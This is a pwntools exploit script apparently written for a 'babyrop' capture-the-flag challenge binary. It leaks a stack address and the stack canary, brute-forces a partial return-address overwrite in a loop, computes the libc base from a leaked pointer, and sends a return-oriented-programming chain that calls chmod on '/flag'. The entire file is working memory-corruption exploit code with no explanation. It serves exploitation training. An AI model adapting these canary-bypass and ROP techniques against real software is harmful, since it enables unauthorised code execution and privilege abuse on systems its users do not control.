from pwn import *
context.log_level = 'debug'

i = 1
while i == 1:
        p = process('/challenge/babyrop_level13.0')
        libc = ELF(p.libc.path)
        #gdb.attach(p,'''break main''')
        p.recvuntil(b'located at: ')
        s = p.recv()[:14]
        leak_stack = int(s.decode(),16)
        canary = leak_stack+72
        print(hex(canary))

        p.sendline(hex(canary).encode())
        p.recvuntil(b'= ')
        s = p.recv()[:18]
        bypass_canary = int(s.decode(),16)
        print(s)
        payload = b'a'*72+p64(bypass_canary)+p64(leak_stack+0x108+0x70)+b'\x97\x76'
        #0x0000000000025697 : mov rsi, qword ptr [rbp - 0x70] ; mov rdi, rbx ; call rsi 

        p.send(payload)
        sleep(0.5)
        s = p.recv()
        if b'located' not in s:
        #if (p.recvuntil(b'located at: ',timeout=1))=="":
                p.close()
                continue
        i = 0
        print('ok')
        ss = s[-91:-77]
        print(ss)
        leak_stack = int(ss.decode(),16)
        re = leak_stack + 88
        p.sendline(hex(re).encode())
        p.recvuntil(b'= ')
        s = p.recv()[:18]
        libc.address = int(s.decode(),16)-libc.sym['__libc_start_main']-243
        gadget1 = 0x23b6a # pop rdi; ret
        gadget2 = 0x2601f # pop rsi; ret
        print(hex(libc.address))
        payload = b'a'*72+p64(bypass_canary)+b'a'*8+p64(libc.address+gadget1)
        payload += p64(re+0x28)
        payload += p64(libc.address+gadget2)+p64(7)+p64(libc.sym['chmod'])
        payload += b'/flag\x00\x00\x00'
        p.send(payload)
        sleep(0.5)
        p.close()
